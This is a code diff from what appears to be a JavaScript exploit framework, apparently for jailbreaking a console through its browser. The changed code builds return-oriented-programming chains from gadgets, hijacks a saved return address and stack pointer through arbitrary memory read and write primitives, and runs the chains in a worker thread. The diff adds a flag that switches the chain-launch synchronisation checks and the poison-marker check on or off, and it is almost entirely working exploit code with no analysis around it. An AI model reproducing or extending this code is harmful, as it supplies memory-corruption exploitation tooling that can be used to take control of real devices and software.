@@ -205,6 +205,11 @@ async function prepareRop(p) {
   const originalReturnAddress = p.read8(returnAddress);
   const stackPointerSlot = returnAddress.add32(0x8);
 
+  // Opt-in synchronisation gates (waitForPark, restoreHook, armedCall poison).
+  // Off by default — the old fire-and-forget path that Poops relies on.
+  // Relapse enables this via runtime.enableSyncGates() before its first chain call.
+  let syncGates = false;
+
   function prepareChain(chain) {
     chain.push(gadgets["pop rdi"]);
     chain.push(originalContext);
@@ -256,7 +261,7 @@ async function prepareRop(p) {
   // consumes the slot when the pending syscall (accept) completes asynchronously;
   // net.js restores the chain via waitDetached().
   async function launchChainDetached(chain) {
-    await waitForPark("detached chain launch");
+    if (syncGates) await waitForPark("detached chain launch");
     const originalStackPointer = p.read8(stackPointerSlot);
     chain.push_write8(originalContext, originalReturnAddress);
     chain.push_write8(originalContext.add32(0x10), returnAddress);
@@ -301,14 +306,16 @@ async function prepareRop(p) {
     const timing = workerTiming;
     let phaseStart = timing ? performance.now() : 0;
     if (timing) timing.calls++;
-    try {
-      await waitForPark("chain launch");
-    } catch (error) {
-      if (timing) {
-        addWorkerTiming(timing, "parkMs", phaseStart);
-        timing.parkFailures++;
+    if (syncGates) {
+      try {
+        await waitForPark("chain launch");
+      } catch (error) {
+        if (timing) {
+          addWorkerTiming(timing, "parkMs", phaseStart);
+          timing.parkFailures++;
+        }
+        throw error;
       }
-      throw error;
     }
     if (timing) phaseStart = addWorkerTiming(timing, "parkMs", phaseStart);
     const originalStackPointer = p.read8(stackPointerSlot);
@@ -347,10 +354,10 @@ async function prepareRop(p) {
       // Even if the chain is still in flight, restoring the slot is the
       // correct recovery: the chain epilogue longjmps to this slot and rets
       // back into the worker's normal park.
-      restoreHook();
+      if (syncGates) restoreHook();
       throw new Error(`the rop worker never answered in ${ROP_WAIT_MS / 1000}s - refusing to continue on a chain that never ran. (Reload.)`);
     }
-    restoreHook();
+    if (syncGates) restoreHook();
   }
 
   const runtime = {
@@ -371,6 +378,8 @@ async function prepareRop(p) {
     launch_chain: launchChain,
     measureWorkerCalls,
     launch_chain_detached: launchChainDetached,
+    enableSyncGates: () => { syncGates = true; },
+    disableSyncGates: () => { syncGates = false; },
     malloc,
     stringify,
     writestr,
@@ -390,9 +399,9 @@ async function prepareRop(p) {
   // the chain provably never executed.
   const baseCall = chain.call.bind(chain);
   chain.call = async function armedCall(rip, rdi, rsi, rdx, rcx, r8, r9) {
-    p.write8(chain.return_value, JB_POISON);
+    if (syncGates) p.write8(chain.return_value, JB_POISON);
     const result = await baseCall(rip, rdi, rsi, rdx, rcx, r8, r9);
-    if (result.low == JB_POISON.low && result.hi == JB_POISON.hi) {
+    if (syncGates && result.low == JB_POISON.low && result.hi == JB_POISON.hi) {
       throw new Error("worker chain did not execute; the return slot still holds the poison marker");
     }
     return result;
